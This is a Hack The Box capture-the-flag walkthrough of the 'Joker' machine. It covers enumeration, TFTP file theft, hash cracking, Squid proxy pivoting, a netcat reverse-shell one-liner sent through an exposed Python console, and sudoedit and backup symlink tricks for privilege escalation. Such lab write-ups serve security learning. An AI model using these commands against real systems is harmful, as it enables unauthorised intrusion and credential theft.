
![logo](/logo.png)

# [Joker- BOX]  
Hi folks, today I am going to solve an Hard rated hack the box machine which was released on 22 Mar 2017 as the eight machine on HTB,Joker created by [eks](https://app.hackthebox.com/users/302)without any further intro, let'sf jump in.

# common enumeration

## Nmap
  *http
  *ssh
  *Squid http
  
###### code-nmap

```code
nmap -sV -sC -oA nmap/joker 10.10.10.21
```

###### Output 

![](/Linux/Linux-Hard/Joker/Screenshots/nmap.png)

```sh
 nmap -sV -sC -oA nmap/joker 10.10.10.21                                                                                           ─╯
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-18 16:28 EAT
Nmap scan report for 10.10.10.21
Host is up (0.34s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.3p1 Ubuntu 1ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 88:24:e3:57:10:9f:1b:17:3d:7a:f3:26:3d:b6:33:4e (RSA)
|   256 76:b6:f6:08:00:bd:68:ce:97:cb:08:e7:77:69:3d:8a (ECDSA)
|_  256 dc:91:e4:8d:d0:16:ce:cf:3d:91:82:09:23:a7:dc:86 (ED25519)
3128/tcp open  http-proxy Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.27 seconds
```

looking at the results  we find out that there are 2 ports open and its a `Ubuntu`and its running an `squid 3.5.12`. 

port[22]-http
port[3128]-http-proxy Squid

when we naviagate to [http://10.10.10.21:3128](http://10.10.10.21:3128)  we find a page  `error page`

![](/Linux/Linux-Hard/Joker/Screenshots/browser.png)

so we set another nmap to check for `UDP` ports

```sh
nmap -sV -sC -sU  -oA nmap/joker 10.10.10.21  
```

![](/Linux/Linux-Hard/Joker/Screenshots/udp.png)

# Exploitation

#### TFTP
Exploiting the TFTP server is trivial it will allow files to be transferred to the local machine. 

```sh
 tftp 10.10.10.21 
```

Once connected, the command `get /etc/squid/squid.conf `will get the Squid configuration file

![](/Linux/Linux-Hard/Joker/Screenshots/tftp.png)

Upon checking the `squid.conf` it revels  references `/etc/squid/passwords`.

![](/Linux/Linux-Hard/Joker/Screenshots/squid.png)

Downloading the passwords file reveals the login credentials for the proxy, however the password is hashed.

![](/Linux/Linux-Hard/Joker/Screenshots/hashed.png)

we we lauch hashcat and to know which hash  this one is we can be able to to go to this page [hashacat_example](https://hashcat.net/wiki/doku.php?id=example_hashes)

![](Linux/Linux-Hard/Joker/Screenshots/hashes.png)

```sh
hashcat -m 1600 hash.txt /usr/share/wordlists/rockyou.txt
```

![](/Linux/Linux-Hard/Joker/Screenshots/hashcat.png)



now after getting the password we go set a proxy then use those credential to view the page without the port.

![](/Linux/Linux-Hard/Joker/Screenshots/foxy.png)


![](/Linux/Linux-Hard/Joker/Screenshots/proxy.png)

Setting up a browser with the proxy and attempting to view http://127.0.0.1 reveals a URL
shortener.

![](/Linux/Linux-Hard/Joker/Screenshots/shorty.png)

Because we are not listenning to port 80 of the `127.0.0.1` of the box lets set a proxychain so that we can be able to fuzz other directories that exist in the box

so lets add an upsream burpsuite 

![](/Linux/Linux-Hard/Joker/Screenshots/burp.png)

Then we add a proxy redirect

![](/Linux/Linux-Hard/Joker/Screenshots/proxyre.png)

so when we do curl to confirm that we can be able to get the content of the shory url 

```sh
curl 127.0.0.1:80
```

![](/Linux/Linux-Hard/Joker/Screenshots/curl.png)


```sh
nano /etc/proxychains4.conf
```

![](/Linux/Linux-Hard/Joker/Screenshots/proxychain.png)

```sh
proxychains gobuster dir -u http://127.0.0.1:80 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -k
```

![](/Linux/Linux-Hard/Joker/Screenshots/gobuster.png)
so upon viewing the console we get a page which seems that we can execute python codes

![](/Linux/Linux-Hard/Joker/Screenshots/console.png)

The Python console at /console/ can be used to obtain a reverse shell. However, only UDP is
available. 

so lets get a shell

```sh
import os
os.popen("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -u 10.10.14.15 1234 >/tmp/f &").read() 
```

![](/Linux/Linux-Hard/Joker/Screenshots/consoleweb.png)

and that way we get shell

![](/Linux/Linux-Hard/Joker/Screenshots/shell.png)

running `sudo -l` it reveals a `NOPASSWD`  file that is run by the user `alekos`. Using the
above exploit, it is possible to create a symbolic link pointing to the a`uthorized_key` file for the
alekos user.

![](/Linux/Linux-Hard/Joker/Screenshots/joker.png)

```sh
ln -s /home/alekos/.ssh/authorized_keys layout.html
```

![](/Linux/Linux-Hard/Joker/Screenshots/alekos.png)

i then cd to `/var/www/testing/` then i creat a folder leshack so that i can be able to do the symbolic link. so this first tries to edit the layout.html will the other tries to edit three files then edits the authorized key

```sh
sudoedit -u alekos /var/www/testing/leshack/layout.html
```

```sh
sudoedit  -u alekos /var/www/ .ssh/authorized_keys /layout.html
```

but when i edit the file to add my ssh am unable to exit from the nano. so i have to get an interactive shell.

```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 [ctrl] + z
 stty raw -echo ; fg
 ```

```sh
export TERM=screen-256color
export SHELL=bash
stty rows 29 cols 135
reset
```

to check for colums and rows in you machine run

```sh
stty -a | head -n1 | cut -d ';' -f 2-3 | cut -b2- | sed 's/; /\n/'
```

![](/Linux/Linux-Hard/Joker/Screenshots/rows.png)

you can generate ths ssh key with

```sh
ssh-keygen
```

![](/Linux/Linux-Hard/Joker/Screenshots/ssh.png)


and after ssh because our key is on authorized keys for alekos we then get shell

![](/Linux/Linux-Hard/Joker/Screenshots/aleko.png)

![](/Linux/Linux-Hard/Joker/Screenshots/shell1.png)

we can get now get the user flag 

![](/Linux/Linux-Hard/Joker/Screenshots/userflag.png)

Now in order to privesc to root on this box we're going to take a look at alekos's files:

```sh
ls -lash backup/
```


![](/Linux/Linux-Hard/Joker/Screenshots/lash.png)

here we see that a backup is being made every 5 minutes by the root user. So let's extract one of these backups to see what it does:

![](/Linux/Linux-Hard/Joker/Screenshots/backup.png)

And here we see that basically there is a backup of the development folder that's being made every 5 minutes. So we basically make a symbolic link to /root/ so that the next backup that's being made is going to be that of the `**/root/**`  directory where the root flag is.

so we have mv the development folder so that we can be able to create alink with the development to the root.

![](/Linux/Linux-Hard/Joker/Screenshots/backupfile.png)


```sh
tar -xvf dev-
```

![](/Linux/Linux-Hard/Joker/Screenshots/root.png)

	-------------------------END successful attack @lesley----------------------